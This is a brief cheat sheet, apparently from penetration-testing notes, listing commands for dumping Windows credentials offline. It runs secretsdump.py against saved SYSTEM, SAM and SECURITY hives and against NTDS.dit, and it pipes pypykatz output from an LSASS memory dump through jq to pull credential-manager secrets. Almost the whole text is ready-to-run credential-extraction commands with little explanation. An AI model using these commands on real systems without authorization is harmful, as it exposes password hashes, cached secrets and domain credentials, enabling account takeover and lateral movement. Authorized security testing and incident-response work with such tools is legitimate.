# Various python tools to dump credentials locally

The SYSTEM hive is needed to retrieve the bootkey and decipher the DB files.

##### Extract creds from SAM and SECURITY (LSA cached secrets)

    secretsdump.py -system ./system.save -sam ./sam.save -security ./security.save LOCAL

##### Extract creds from NTDS.dit

    secretsdump.py -system ./system.save -ntds ./NTDS.save LOCAL

Read an LSASS dump with pypykatz:

    pypykatz lsa --json minidump $i | jq 'first(.[]).logon_sessions | keys[] as $k | (.[$k] | .credman_creds)' | grep -v "\[\]" | grep -v "^\[" | grep -v "^\]"
